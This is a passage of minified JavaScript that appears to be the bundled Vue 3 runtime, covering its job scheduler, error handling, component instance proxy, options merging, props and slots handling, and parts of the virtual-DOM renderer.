  } catch (s) {
    Qr(s, t, r);
  }
}
function Ze(e, t, r, o) {
  if (H(e)) {
    const s = xr(e, t, r, o);
    return s && tn(s) && s.catch((n) => {
      Qr(n, t, r);
    }), s;
  }
  if (M(e)) {
    const s = [];
    for (let n = 0; n < e.length; n++)
      s.push(Ze(e[n], t, r, o));
    return s;
  }
}
function Qr(e, t, r, o = !0) {
  const s = t ? t.vnode : null, { errorHandler: n, throwUnhandledErrorInProduction: i } = t && t.appContext.config || te;
  if (t) {
    let a = t.parent;
    const l = t.proxy, u = `https://vuejs.org/error-reference/#runtime-${r}`;
    for (; a; ) {
      const c = a.ec;
      if (c) {
        for (let p = 0; p < c.length; p++)
          if (c[p](e, l, u) === !1)
            return;
      }
      a = a.parent;
    }
    if (n) {
      it(), xr(n, null, 10, [
        e,
        l,
        u
      ]), lt();
      return;
    }
  }
  hi(e, r, s, o, i);
}
function hi(e, t, r, o = !0, s = !1) {
  if (s)
    throw e;
  console.error(e);
}
const we = [];
let Ge = -1;
const Vt = [];
let pt = null, Lt = 0;
const Pn = /* @__PURE__ */ Promise.resolve();
let Lr = null;
function Jo(e) {
  const t = Lr || Pn;
  return e ? t.then(this ? e.bind(this) : e) : t;
}
function mi(e) {
  let t = Ge + 1, r = we.length;
  for (; t < r; ) {
    const o = t + r >>> 1, s = we[o], n = dr(s);
    n < e || n === e && s.flags & 2 ? t = o + 1 : r = o;
  }
  return t;
}
function Uo(e) {
  if (!(e.flags & 1)) {
    const t = dr(e), r = we[we.length - 1];
    !r || // fast path when the job id is larger than the tail
    !(e.flags & 2) && t >= dr(r) ? we.push(e) : we.splice(mi(t), 0, e), e.flags |= 1, On();
  }
}
function On() {
  Lr || (Lr = Pn.then(En));
}
function xi(e) {
  M(e) ? Vt.push(...e) : pt && e.id === -1 ? pt.splice(Lt + 1, 0, e) : e.flags & 1 || (Vt.push(e), e.flags |= 1), On();
}
function ls(e, t, r = Ge + 1) {
  for (; r < we.length; r++) {
    const o = we[r];
    if (o && o.flags & 2) {
      if (e && o.id !== e.uid)
        continue;
      we.splice(r, 1), r--, o.flags & 4 && (o.flags &= -2), o(), o.flags & 4 || (o.flags &= -2);
    }
  }
}
function An(e) {
  if (Vt.length) {
    const t = [...new Set(Vt)].sort(
      (r, o) => dr(r) - dr(o)
    );
    if (Vt.length = 0, pt) {
      pt.push(...t);
      return;
    }
    for (pt = t, Lt = 0; Lt < pt.length; Lt++) {
      const r = pt[Lt];
      r.flags & 4 && (r.flags &= -2), r.flags & 8 || r(), r.flags &= -2;
    }
    pt = null, Lt = 0;
  }
}
const dr = (e) => e.id == null ? e.flags & 2 ? -1 : 1 / 0 : e.id;
function En(e) {
  try {
    for (Ge = 0; Ge < we.length; Ge++) {
      const t = we[Ge];
      t && !(t.flags & 8) && (t.flags & 4 && (t.flags &= -2), xr(
        t,
        t.i,
        t.i ? 15 : 14
      ), t.flags & 4 || (t.flags &= -2));
    }
  } finally {
    for (; Ge < we.length; Ge++) {
      const t = we[Ge];
      t && (t.flags &= -2);
    }
    Ge = -1, we.length = 0, An(), Lr = null, (we.length || Vt.length) && En();
  }
}
let Re = null, In = null;
function Nr(e) {
  const t = Re;
  return Re = e, In = e && e.type.__scopeId || null, t;
}
function vi(e, t = Re, r) {
  if (!t || e._n)
    return e;
  const o = (...s) => {
    o._d && xs(-1);
    const n = Nr(t);
    let i;
    try {
      i = e(...s);
    } finally {
      Nr(n), o._d && xs(1);
    }
    return i;
  };
  return o._n = !0, o._c = !0, o._d = !0, o;
}
function Ct(e, t) {
  if (Re === null)
    return e;
  const r = ro(Re), o = e.dirs || (e.dirs = []);
  for (let s = 0; s < t.length; s++) {
    let [n, i, a, l = te] = t[s];
    n && (H(n) && (n = {
      mounted: n,
      updated: n
    }), n.deep && nt(i), o.push({
      dir: n,
      instance: r,
      value: i,
      oldValue: void 0,
      arg: a,
      modifiers: l
    }));
  }
  return e;
}
function wt(e, t, r, o) {
  const s = e.dirs, n = t && t.dirs;
  for (let i = 0; i < s.length; i++) {
    const a = s[i];
    n && (a.oldValue = n[i].value);
    let l = a.dir[o];
    l && (it(), Ze(l, r, 8, [
      e.el,
      a,
      e,
      t
    ]), lt());
  }
}
const yi = Symbol("_vte"), ki = (e) => e.__isTeleport, wi = Symbol("_leaveCb");
function Go(e, t) {
  e.shapeFlag & 6 && e.component ? (e.transition = t, Go(e.component.subTree, t)) : e.shapeFlag & 128 ? (e.ssContent.transition = t.clone(e.ssContent), e.ssFallback.transition = t.clone(e.ssFallback)) : e.transition = t;
}
// @__NO_SIDE_EFFECTS__
function vr(e, t) {
  return H(e) ? (
    // #8236: extend call and options.name access are considered side-effects
    // by Rollup, so we have to wrap it in a pure-annotated IIFE.
    ye({ name: e.name }, t, { setup: e })
  ) : e;
}
function zn(e) {
  e.ids = [e.ids[0] + e.ids[2]++ + "-", 0, 0];
}
const Mr = /* @__PURE__ */ new WeakMap();
function tr(e, t, r, o, s = !1) {
  if (M(e)) {
    e.forEach(
      (h, b) => tr(
        h,
        t && (M(t) ? t[b] : t),
        r,
        o,
        s
      )
    );
    return;
  }
  if (rr(o) && !s) {
    o.shapeFlag & 512 && o.type.__asyncResolved && o.component.subTree.component && tr(e, t, r, o.component.subTree);
    return;
  }
  const n = o.shapeFlag & 4 ? ro(o.component) : o.el, i = s ? null : n, { i: a, r: l } = e, u = t && t.r, c = a.refs === te ? a.refs = {} : a.refs, p = a.setupState, m = G(p), g = p === te ? en : (h) => Y(m, h);
  if (u != null && u !== l) {
    if (cs(t), ce(u))
      c[u] = null, g(u) && (p[u] = null);
    else if (le(u)) {
      u.value = null;
      const h = t;
      h.k && (c[h.k] = null);
    }
  }
  if (H(l))
    xr(l, a, 12, [i, c]);
  else {
    const h = ce(l), b = le(l);
    if (h || b) {
      const C = () => {
        if (e.f) {
          const I = h ? g(l) ? p[l] : c[l] : l.value;
          if (s)
            M(I) && Lo(I, n);
          else if (M(I))
            I.includes(n) || I.push(n);
          else if (h)
            c[l] = [n], g(l) && (p[l] = c[l]);
          else {
            const R = [n];
            l.value = R, e.k && (c[e.k] = R);
          }
        } else h ? (c[l] = i, g(l) && (p[l] = i)) : b && (l.value = i, e.k && (c[e.k] = i));
      };
      if (i) {
        const I = () => {
          C(), Mr.delete(e);
        };
        I.id = -1, Mr.set(e, I), Oe(I, r);
      } else
        cs(e), C();
    }
  }
}
function cs(e) {
  const t = Mr.get(e);
  t && (t.flags |= 8, Mr.delete(e));
}
Gr().requestIdleCallback;
Gr().cancelIdleCallback;
const rr = (e) => !!e.type.__asyncLoader, Rn = (e) => e.type.__isKeepAlive;
function _i(e, t) {
  Ln(e, "a", t);
}
function Si(e, t) {
  Ln(e, "da", t);
}
function Ln(e, t, r = _e) {
  const o = e.__wdc || (e.__wdc = () => {
    let s = r;
    for (; s; ) {
      if (s.isDeactivated)
        return;
      s = s.parent;
    }
    return e();
  });
  if (Zr(t, o, r), r) {
    let s = r.parent;
    for (; s && s.parent; )
      Rn(s.parent.vnode) && Ci(o, t, r, s), s = s.parent;
  }
}
function Ci(e, t, r, o) {
  const s = Zr(
    t,
    e,
    o,
    !0
    /* prepend */
  );
  Mn(() => {
    Lo(o[t], s);
  }, r);
}
function Zr(e, t, r = _e, o = !1) {
  if (r) {
    const s = r[e] || (r[e] = []), n = t.__weh || (t.__weh = (...i) => {
      it();
      const a = yr(r), l = Ze(t, r, e, i);
      return a(), lt(), l;
    });
    return o ? s.unshift(n) : s.push(n), n;
  }
}
const ct = (e) => (t, r = _e) => {
  (!pr || e === "sp") && Zr(e, (...o) => t(...o), r);
}, ji = ct("bm"), Nn = ct("m"), Ti = ct(
  "bu"
), $i = ct("u"), Pi = ct(
  "bum"
), Mn = ct("um"), Oi = ct(
  "sp"
), Ai = ct("rtg"), Ei = ct("rtc");
function Ii(e, t = _e) {
  Zr("ec", e, t);
}
const zi = Symbol.for("v-ndc");
function Me(e, t, r, o) {
  let s;
  const n = r, i = M(e);
  if (i || ce(e)) {
    const a = i && ht(e);
    let l = !1, u = !1;
    a && (l = !Le(e), u = xt(e), e = Xr(e)), s = new Array(e.length);
    for (let c = 0, p = e.length; c < p; c++)
      s[c] = t(
        l ? u ? zr(be(e[c])) : be(e[c]) : e[c],
        c,
        void 0,
        n
      );
  } else if (typeof e == "number") {
    s = new Array(e);
    for (let a = 0; a < e; a++)
      s[a] = t(a + 1, a, void 0, n);
  } else if (se(e))
    if (e[Symbol.iterator])
      s = Array.from(
        e,
        (a, l) => t(a, l, void 0, n)
      );
    else {
      const a = Object.keys(e);
      s = new Array(a.length);
      for (let l = 0, u = a.length; l < u; l++) {
        const c = a[l];
        s[l] = t(e[c], c, l, n);
      }
    }
  else
    s = [];
  return s;
}
const _o = (e) => e ? na(e) ? ro(e) : _o(e.parent) : null, or = (
  // Move PURE marker to new line to workaround compiler discarding it
  // due to type annotation
  /* @__PURE__ */ ye(/* @__PURE__ */ Object.create(null), {
    $: (e) => e,
    $el: (e) => e.vnode.el,
    $data: (e) => e.data,
    $props: (e) => e.props,
    $attrs: (e) => e.attrs,
    $slots: (e) => e.slots,
    $refs: (e) => e.refs,
    $parent: (e) => _o(e.parent),
    $root: (e) => _o(e.root),
    $host: (e) => e.ce,
    $emit: (e) => e.emit,
    $options: (e) => Dn(e),
    $forceUpdate: (e) => e.f || (e.f = () => {
      Uo(e.update);
    }),
    $nextTick: (e) => e.n || (e.n = Jo.bind(e.proxy)),
    $watch: (e) => ol.bind(e)
  })
), co = (e, t) => e !== te && !e.__isScriptSetup && Y(e, t), Ri = {
  get({ _: e }, t) {
    if (t === "__v_skip")
      return !0;
    const { ctx: r, setupState: o, data: s, props: n, accessCache: i, type: a, appContext: l } = e;
    let u;
    if (t[0] !== "$") {
      const g = i[t];
      if (g !== void 0)
        switch (g) {
          case 1:
            return o[t];
          case 2:
            return s[t];
          case 4:
            return r[t];
          case 3:
            return n[t];
        }
      else {
        if (co(o, t))
          return i[t] = 1, o[t];
        if (s !== te && Y(s, t))
          return i[t] = 2, s[t];
        if (
          // only cache other properties when instance has declared (thus stable)
          // props
          (u = e.propsOptions[0]) && Y(u, t)
        )
          return i[t] = 3, n[t];
        if (r !== te && Y(r, t))
          return i[t] = 4, r[t];
        So && (i[t] = 0);
      }
    }
    const c = or[t];
    let p, m;
    if (c)
      return t === "$attrs" && ve(e.attrs, "get", ""), c(e);
    if (
      // css module (injected by vue-loader)
      (p = a.__cssModules) && (p = p[t])
    )
      return p;
    if (r !== te && Y(r, t))
      return i[t] = 4, r[t];
    if (
      // global properties
      m = l.config.globalProperties, Y(m, t)
    )
      return m[t];
  },
  set({ _: e }, t, r) {
    const { data: o, setupState: s, ctx: n } = e;
    return co(s, t) ? (s[t] = r, !0) : o !== te && Y(o, t) ? (o[t] = r, !0) : Y(e.props, t) || t[0] === "$" && t.slice(1) in e ? !1 : (n[t] = r, !0);
  },
  has({
    _: { data: e, setupState: t, accessCache: r, ctx: o, appContext: s, propsOptions: n, type: i }
  }, a) {
    let l, u;
    return !!(r[a] || e !== te && a[0] !== "$" && Y(e, a) || co(t, a) || (l = n[0]) && Y(l, a) || Y(o, a) || Y(or, a) || Y(s.config.globalProperties, a) || (u = i.__cssModules) && u[a]);
  },
  defineProperty(e, t, r) {
    return r.get != null ? e._.accessCache[t] = 0 : Y(r, "value") && this.set(e, t, r.value, null), Reflect.defineProperty(e, t, r);
  }
};
function us(e) {
  return M(e) ? e.reduce(
    (t, r) => (t[r] = null, t),
    {}
  ) : e;
}
let So = !0;
function Li(e) {
  const t = Dn(e), r = e.proxy, o = e.ctx;
  So = !1, t.beforeCreate && ds(t.beforeCreate, e, "bc");
  const {
    // state
    data: s,
    computed: n,
    methods: i,
    watch: a,
    provide: l,
    inject: u,
    // lifecycle
    created: c,
    beforeMount: p,
    mounted: m,
    beforeUpdate: g,
    updated: h,
    activated: b,
    deactivated: C,
    beforeDestroy: I,
    beforeUnmount: R,
    destroyed: F,
    unmounted: O,
    render: B,
    renderTracked: q,
    renderTriggered: ee,
    errorCaptured: K,
    serverPrefetch: W,
    // public API
    expose: Q,
    inheritAttrs: ie,
    // assets
    components: de,
    directives: ge,
    filters: Se
  } = t;
  if (u && Ni(u, o, null), i)
    for (const V in i) {
      const U = i[V];
      H(U) && (o[V] = U.bind(r));
    }
  if (s) {
    const V = s.call(r, r);
    se(V) && (e.data = Wt(V));
  }
  if (So = !0, n)
    for (const V in n) {
      const U = n[V], Ce = H(U) ? U.bind(r, r) : H(U.get) ? U.get.bind(r, r) : Xe, je = !H(U) && H(U.set) ? U.set.bind(r) : Xe, fe = Ve({
        get: Ce,
        set: je
      });
      Object.defineProperty(o, V, {
        enumerable: !0,
        configurable: !0,
        get: () => fe.value,
        set: (pe) => fe.value = pe
      });
    }
  if (a)
    for (const V in a)
      Fn(a[V], o, r, V);
  if (l) {
    const V = H(l) ? l.call(r) : l;
    Reflect.ownKeys(V).forEach((U) => {
      Ki(U, V[U]);
    });
  }
  c && ds(c, e, "c");
  function Z(V, U) {
    M(U) ? U.forEach((Ce) => V(Ce.bind(r))) : U && V(U.bind(r));
  }
  if (Z(ji, p), Z(Nn, m), Z(Ti, g), Z($i, h), Z(_i, b), Z(Si, C), Z(Ii, K), Z(Ei, q), Z(Ai, ee), Z(Pi, R), Z(Mn, O), Z(Oi, W), M(Q))
    if (Q.length) {
      const V = e.exposed || (e.exposed = {});
      Q.forEach((U) => {
        Object.defineProperty(V, U, {
          get: () => r[U],
          set: (Ce) => r[U] = Ce,
          enumerable: !0
        });
      });
    } else e.exposed || (e.exposed = {});
  B && e.render === Xe && (e.render = B), ie != null && (e.inheritAttrs = ie), de && (e.components = de), ge && (e.directives = ge), W && zn(e);
}
function Ni(e, t, r = Xe) {
  M(e) && (e = Co(e));
  for (const o in e) {
    const s = e[o];
    let n;
    se(s) ? "default" in s ? n = sr(
      s.from || o,
      s.default,
      !0
    ) : n = sr(s.from || o) : n = sr(s), le(n) ? Object.defineProperty(t, o, {
      enumerable: !0,
      configurable: !0,
      get: () => n.value,
      set: (i) => n.value = i
    }) : t[o] = n;
  }
}
function ds(e, t, r) {
  Ze(
    M(e) ? e.map((o) => o.bind(t.proxy)) : e.bind(t.proxy),
    t,
    r
  );
}
function Fn(e, t, r, o) {
  let s = o.includes(".") ? Zn(r, o) : () => r[o];
  if (ce(e)) {
    const n = t[e];
    H(n) && Ye(s, n);
  } else if (H(e))
    Ye(s, e.bind(r));
  else if (se(e))
    if (M(e))
      e.forEach((n) => Fn(n, t, r, o));
    else {
      const n = H(e.handler) ? e.handler.bind(r) : t[e.handler];
      H(n) && Ye(s, n, e);
    }
}
function Dn(e) {
  const t = e.type, { mixins: r, extends: o } = t, {
    mixins: s,
    optionsCache: n,
    config: { optionMergeStrategies: i }
  } = e.appContext, a = n.get(t);
  let l;
  return a ? l = a : !s.length && !r && !o ? l = t : (l = {}, s.length && s.forEach(
    (u) => Fr(l, u, i, !0)
  ), Fr(l, t, i)), se(t) && n.set(t, l), l;
}
function Fr(e, t, r, o = !1) {
  const { mixins: s, extends: n } = t;
  n && Fr(e, n, r, !0), s && s.forEach(
    (i) => Fr(e, i, r, !0)
  );
  for (const i in t)
    if (!(o && i === "expose")) {
      const a = Mi[i] || r && r[i];
      e[i] = a ? a(e[i], t[i]) : t[i];
    }
  return e;
}
const Mi = {
  data: fs,
  props: ps,
  emits: ps,
  // objects
  methods: Xt,
  computed: Xt,
  // lifecycle
  beforeCreate: ke,
  created: ke,
  beforeMount: ke,
  mounted: ke,
  beforeUpdate: ke,
  updated: ke,
  beforeDestroy: ke,
  beforeUnmount: ke,
  destroyed: ke,
  unmounted: ke,
  activated: ke,
  deactivated: ke,
  errorCaptured: ke,
  serverPrefetch: ke,
  // assets
  components: Xt,
  directives: Xt,
  // watch
  watch: Di,
  // provide / inject
  provide: fs,
  inject: Fi
};
function fs(e, t) {
  return t ? e ? function() {
    return ye(
      H(e) ? e.call(this, this) : e,
      H(t) ? t.call(this, this) : t
    );
  } : t : e;
}
function Fi(e, t) {
  return Xt(Co(e), Co(t));
}
function Co(e) {
  if (M(e)) {
    const t = {};
    for (let r = 0; r < e.length; r++)
      t[e[r]] = e[r];
    return t;
  }
  return e;
}
function ke(e, t) {
  return e ? [...new Set([].concat(e, t))] : t;
}
function Xt(e, t) {
  return e ? ye(/* @__PURE__ */ Object.create(null), e, t) : t;
}
function ps(e, t) {
  return e ? M(e) && M(t) ? [.../* @__PURE__ */ new Set([...e, ...t])] : ye(
    /* @__PURE__ */ Object.create(null),
    us(e),
    us(t ?? {})
  ) : t;
}
function Di(e, t) {
  if (!e) return t;
  if (!t) return e;
  const r = ye(/* @__PURE__ */ Object.create(null), e);
  for (const o in t)
    r[o] = ke(e[o], t[o]);
  return r;
}
function Vn() {
  return {
    app: null,
    config: {
      isNativeTag: en,
      performance: !1,
      globalProperties: {},
      optionMergeStrategies: {},
      errorHandler: void 0,
      warnHandler: void 0,
      compilerOptions: {}
    },
    mixins: [],
    components: {},
    directives: {},
    provides: /* @__PURE__ */ Object.create(null),
    optionsCache: /* @__PURE__ */ new WeakMap(),
    propsCache: /* @__PURE__ */ new WeakMap(),
    emitsCache: /* @__PURE__ */ new WeakMap()
  };
}
let Vi = 0;
function Bi(e, t) {
  return function(o, s = null) {
    H(o) || (o = ye({}, o)), s != null && !se(s) && (s = null);
    const n = Vn(), i = /* @__PURE__ */ new WeakSet(), a = [];
    let l = !1;
    const u = n.app = {
      _uid: Vi++,
      _component: o,
      _props: s,
      _container: null,
      _context: n,
      _instance: null,
      version: Sl,
      get config() {
        return n.config;
      },
      set config(c) {
      },
      use(c, ...p) {
        return i.has(c) || (c && H(c.install) ? (i.add(c), c.install(u, ...p)) : H(c) && (i.add(c), c(u, ...p))), u;
      },
      mixin(c) {
        return n.mixins.includes(c) || n.mixins.push(c), u;
      },
      component(c, p) {
        return p ? (n.components[c] = p, u) : n.components[c];
      },
      directive(c, p) {
        return p ? (n.directives[c] = p, u) : n.directives[c];
      },
      mount(c, p, m) {
        if (!l) {
          const g = u._ceVNode || Ke(o, s);
          return g.appContext = n, m === !0 ? m = "svg" : m === !1 && (m = void 0), e(g, c, m), l = !0, u._container = c, c.__vue_app__ = u, ro(g.component);
        }
      },
      onUnmount(c) {
        a.push(c);
      },
      unmount() {
        l && (Ze(
          a,
          u._instance,
          16
        ), e(null, u._container), delete u._container.__vue_app__);
      },
      provide(c, p) {
        return n.provides[c] = p, u;
      },
      runWithContext(c) {
        const p = Pt;
        Pt = u;
        try {
          return c();
        } finally {
          Pt = p;
        }
      }
    };
    return u;
  };
}
let Pt = null;
function Ki(e, t) {
  if (_e) {
    let r = _e.provides;
    const o = _e.parent && _e.parent.provides;
    o === r && (r = _e.provides = Object.create(o)), r[e] = t;
  }
}
function sr(e, t, r = !1) {
  const o = Qo();
  if (o || Pt) {
    let s = Pt ? Pt._context.provides : o ? o.parent == null || o.ce ? o.vnode.appContext && o.vnode.appContext.provides : o.parent.provides : void 0;
    if (s && e in s)
      return s[e];
    if (arguments.length > 1)
      return r && H(t) ? t.call(o && o.proxy) : t;
  }
}
function Hi() {
  return !!(Qo() || Pt);
}
const Bn = {}, Kn = () => Object.create(Bn), Hn = (e) => Object.getPrototypeOf(e) === Bn;
function Wi(e, t, r, o = !1) {
  const s = {}, n = Kn();
  e.propsDefaults = /* @__PURE__ */ Object.create(null), Wn(e, t, s, n);
  for (const i in e.propsOptions[0])
    i in s || (s[i] = void 0);
  r ? e.props = o ? s : ni(s) : e.type.props ? e.props = s : e.props = n, e.attrs = n;
}
function Ji(e, t, r, o) {
  const {
    props: s,
    attrs: n,
    vnode: { patchFlag: i }
  } = e, a = G(s), [l] = e.propsOptions;
  let u = !1;
  if (
    // always force full diff in dev
    // - #1942 if hmr is enabled with sfc component
    // - vite#872 non-sfc component used by sfc component
    (o || i > 0) && !(i & 16)
  ) {
    if (i & 8) {
      const c = e.vnode.dynamicProps;
      for (let p = 0; p < c.length; p++) {
        let m = c[p];
        if (eo(e.emitsOptions, m))
          continue;
        const g = t[m];
        if (l)
          if (Y(n, m))
            g !== n[m] && (n[m] = g, u = !0);
          else {
            const h = mt(m);
            s[h] = jo(
              l,
              a,
              h,
              g,
              e,
              !1
            );
          }
        else
          g !== n[m] && (n[m] = g, u = !0);
      }
    }
  } else {
    Wn(e, t, s, n) && (u = !0);
    let c;
    for (const p in a)
      (!t || // for camelCase
      !Y(t, p) && // it's possible the original props was passed in as kebab-case
      // and converted to camelCase (#955)
      ((c = At(p)) === p || !Y(t, c))) && (l ? r && // for camelCase
      (r[p] !== void 0 || // for kebab-case
      r[c] !== void 0) && (s[p] = jo(
        l,
        a,
        p,
        void 0,
        e,
        !0
      )) : delete s[p]);
    if (n !== a)
      for (const p in n)
        (!t || !Y(t, p)) && (delete n[p], u = !0);
  }
  u && st(e.attrs, "set", "");
}
function Wn(e, t, r, o) {
  const [s, n] = e.propsOptions;
  let i = !1, a;
  if (t)
    for (let l in t) {
      if (Qt(l))
        continue;
      const u = t[l];
      let c;
      s && Y(s, c = mt(l)) ? !n || !n.includes(c) ? r[c] = u : (a || (a = {}))[c] = u : eo(e.emitsOptions, l) || (!(l in o) || u !== o[l]) && (o[l] = u, i = !0);
    }
  if (n) {
    const l = G(r), u = a || te;
    for (let c = 0; c < n.length; c++) {
      const p = n[c];
      r[p] = jo(
        s,
        l,
        p,
        u[p],
        e,
        !Y(u, p)
      );
    }
  }
  return i;
}
function jo(e, t, r, o, s, n) {
  const i = e[r];
  if (i != null) {
    const a = Y(i, "default");
    if (a && o === void 0) {
      const l = i.default;
      if (i.type !== Function && !i.skipFactory && H(l)) {
        const { propsDefaults: u } = s;
        if (r in u)
          o = u[r];
        else {
          const c = yr(s);
          o = u[r] = l.call(
            null,
            t
          ), c();
        }
      } else
        o = l;
      s.ce && s.ce._setProp(r, o);
    }
    i[
      0
      /* shouldCast */
    ] && (n && !a ? o = !1 : i[
      1
      /* shouldCastTrue */
    ] && (o === "" || o === At(r)) && (o = !0));
  }
  return o;
}
const Ui = /* @__PURE__ */ new WeakMap();
function Jn(e, t, r = !1) {
  const o = r ? Ui : t.propsCache, s = o.get(e);
  if (s)
    return s;
  const n = e.props, i = {}, a = [];
  let l = !1;
  if (!H(e)) {
    const c = (p) => {
      l = !0;
      const [m, g] = Jn(p, t, !0);
      ye(i, m), g && a.push(...g);
    };
    !r && t.mixins.length && t.mixins.forEach(c), e.extends && c(e.extends), e.mixins && e.mixins.forEach(c);
  }
  if (!n && !l)
    return se(e) && o.set(e, Ft), Ft;
  if (M(n))
    for (let c = 0; c < n.length; c++) {
      const p = mt(n[c]);
      bs(p) && (i[p] = te);
    }
  else if (n)
    for (const c in n) {
      const p = mt(c);
      if (bs(p)) {
        const m = n[c], g = i[p] = M(m) || H(m) ? { type: m } : ye({}, m), h = g.type;
        let b = !1, C = !0;
        if (M(h))
          for (let I = 0; I < h.length; ++I) {
            const R = h[I], F = H(R) && R.name;
            if (F === "Boolean") {
              b = !0;
              break;
            } else F === "String" && (C = !1);
          }
        else
          b = H(h) && h.name === "Boolean";
        g[
          0
          /* shouldCast */
        ] = b, g[
          1
          /* shouldCastTrue */
        ] = C, (b || Y(g, "default")) && a.push(p);
      }
    }
  const u = [i, a];
  return se(e) && o.set(e, u), u;
}
function bs(e) {
  return e[0] !== "$" && !Qt(e);
}
const qo = (e) => e === "_" || e === "_ctx" || e === "$stable", Yo = (e) => M(e) ? e.map(qe) : [qe(e)], Gi = (e, t, r) => {
  if (t._n)
    return t;
  const o = vi((...s) => Yo(t(...s)), r);
  return o._c = !1, o;
}, Un = (e, t, r) => {
  const o = e._ctx;
  for (const s in e) {
    if (qo(s)) continue;
    const n = e[s];
    if (H(n))
      t[s] = Gi(s, n, o);
    else if (n != null) {
      const i = Yo(n);
      t[s] = () => i;
    }
  }
}, Gn = (e, t) => {
  const r = Yo(t);
  e.slots.default = () => r;
}, qn = (e, t, r) => {
  for (const o in t)
    (r || !qo(o)) && (e[o] = t[o]);
}, qi = (e, t, r) => {
  const o = e.slots = Kn();
  if (e.vnode.shapeFlag & 32) {
    const s = t._;
    s ? (qn(o, t, r), r && nn(o, "_", s, !0)) : Un(t, o);
  } else t && Gn(e, t);
}, Yi = (e, t, r) => {
  const { vnode: o, slots: s } = e;
  let n = !0, i = te;
  if (o.shapeFlag & 32) {
    const a = t._;
    a ? r && a === 1 ? n = !1 : qn(s, t, r) : (n = !t.$stable, Un(t, s)), i = t;
  } else t && (Gn(e, t), i = { default: 1 });
  if (n)
    for (const a in s)
      !qo(a) && i[a] == null && delete s[a];
}, Oe = dl;
function Xi(e) {
  return Qi(e);
}
function Qi(e, t) {
  const r = Gr();
  r.__VUE__ = !0;
  const {
    insert: o,
    remove: s,
    patchProp: n,
    createElement: i,
    createText: a,
    createComment: l,
    setText: u,
    setElementText: c,
    parentNode: p,
    nextSibling: m,
    setScopeId: g = Xe,
    insertStaticContent: h
  } = e, b = (d, f, v, w = null, y = null, k = null, T = void 0, j = null, S = !!f.dynamicChildren) => {
    if (d === f)
      return;
    d && !qt(d, f) && (w = Et(d), pe(d, y, k, !0), d = null), f.patchFlag === -2 && (S = !1, f.dynamicChildren = null);
    const { type: _, ref: N, shapeFlag: $ } = f;
    switch (_) {
      case to:
        C(d, f, v, w);
        break;
      case vt:
        I(d, f, v, w);
        break;
      case fo:
        d == null && R(f, v, w, T);
        break;
      case ne:
        de(
          d,
          f,
          v,
          w,
          y,
          k,
          T,
          j,
          S
        );
        break;
      default:
        $ & 1 ? B(
          d,
          f,
          v,
          w,
          y,
          k,
          T,
          j,
          S
        ) : $ & 6 ? ge(
          d,
          f,
          v,
          w,
          y,
          k,
          T,
          j,
          S
        ) : ($ & 64 || $ & 128) && _.process(
          d,
          f,
          v,
          w,
          y,
          k,
          T,
          j,
          S,
          kt
        );
    }
    N != null && y ? tr(N, d && d.ref, k, f || d, !f) : N == null && d && d.ref != null && tr(d.ref, null, k, d, !0);
  }, C = (d, f, v, w) => {
    if (d == null)
      o(
        f.el = a(f.children),
        v,
        w
      );
    else {
      const y = f.el = d.el;
      f.children !== d.children && u(y, f.children);
    }
  }, I = (d, f, v, w) => {
    d == null ? o(
      f.el = l(f.children || ""),
      v,
      w
    ) : f.el = d.el;
  }, R = (d, f, v, w) => {
    [d.el, d.anchor] = h(
      d.children,
      f,
      v,
      w,
      d.el,
      d.anchor
    );
  }, F = ({ el: d, anchor: f }, v, w) => {
    let y;
    for (; d && d !== f; )
      y = m(d), o(d, v, w), d = y;
    o(f, v, w);
  }, O = ({ el: d, anchor: f }) => {
    let v;
    for (; d && d !== f; )
      v = m(d), s(d), d = v;
    s(f);
  }, B = (d, f, v, w, y, k, T, j, S) => {
    f.type === "svg" ? T = "svg" : f.type === "math" && (T = "mathml"), d == null ? q(
      f,
      v,
      w,
      y,
      k,
      T,
      j,
      S
    ) : W(
      d,
      f,
      y,
      k,
      T,
      j,
      S
    );
  }, q = (d, f, v, w, y, k, T, j) => {
    let S, _;
    const { props: N, shapeFlag: $, transition: z, dirs: D } = d;
    if (S = d.el = i(
      d.type,
      k,
      N && N.is,
      N
    ), $ & 8 ? c(S, d.children) : $ & 16 && K(
      d.children,
      S,
      null,
      w,
      y,
      uo(d, k),
      T,
      j
    ), D && wt(d, null, w, "created"), ee(S, d, d.scopeId, T, w), N) {
      for (const re in N)
        re !== "value" && !Qt(re) && n(S, re, null, N[re], k, w);
      "value" in N && n(S, "value", null, N.value, k), (_ = N.onVnodeBeforeMount) && Ue(_, w, d);
    }
    D && wt(d, null, w, "beforeMount");
    const J = Zi(y, z);
    J && z.beforeEnter(S), o(S, f, v), ((_ = N && N.onVnodeMounted) || J || D) && Oe(() => {
      _ && Ue(_, w, d), J && z.enter(S), D && wt(d, null, w, "mounted");
    }, y);
  }, ee = (d, f, v, w, y) => {
    if (v && g(d, v), w)
      for (let k = 0; k < w.length; k++)
        g(d, w[k]);
    if (y) {
      let k = y.subTree;
      if (f === k || ta(k.type) && (k.ssContent === f || k.ssFallback === f)) {
        const T = y.vnode;
        ee(
          d,
          T,
          T.scopeId,
          T.slotScopeIds,
          y.parent
        );
      }
    }
  }, K = (d, f, v, w, y, k, T, j, S = 0) => {
    for (let _ = S; _ < d.length; _++) {
      const N = d[_] = j ? bt(d[_]) : qe(d[_]);
      b(
        null,
        N,
        f,
        v,
        w,
        y,
        k,
        T,
        j
      );
    }
  }, W = (d, f, v, w, y, k, T) => {
    const j = f.el = d.el;
    let { patchFlag: S, dynamicChildren: _, dirs: N } = f;
    S |= d.patchFlag & 16;
    const $ = d.props || te, z = f.props || te;
    let D;
    if (v && _t(v, !1), (D = z.onVnodeBeforeUpdate) && Ue(D, v, f, d), N && wt(f, d, v, "beforeUpdate"), v && _t(v, !0), ($.innerHTML && z.innerHTML == null || $.textContent && z.textContent == null) && c(j, ""), _ ? Q(
      d.dynamicChildren,
      _,
      j,
      v,
      w,
      uo(f, y),
      k
    ) : T || U(
      d,
      f,
      j,
      null,
      v,
      w,
      uo(f, y),
      k,
      !1
    ), S > 0) {
      if (S & 16)
        ie(j, $, z, v, y);
      else if (S & 2 && $.class !== z.class && n(j, "class", null, z.class, y), S & 4 && n(j, "style", $.style, z.style, y), S & 8) {
        const J = f.dynamicProps;
        for (let re = 0; re < J.length; re++) {
          const X = J[re], Te = $[X], $e = z[X];
          ($e !== Te || X === "value") && n(j, X, Te, $e, y, v);
        }
      }
      S & 1 && d.children !== f.children && c(j, f.children);
    } else !T && _ == null && ie(j, $, z, v, y);
    ((D = z.onVnodeUpdated) || N) && Oe(() => {
      D && Ue(D, v, f, d), N && wt(f, d, v, "updated");
    }, w);
  }, Q = (d, f, v, w, y, k, T) => {
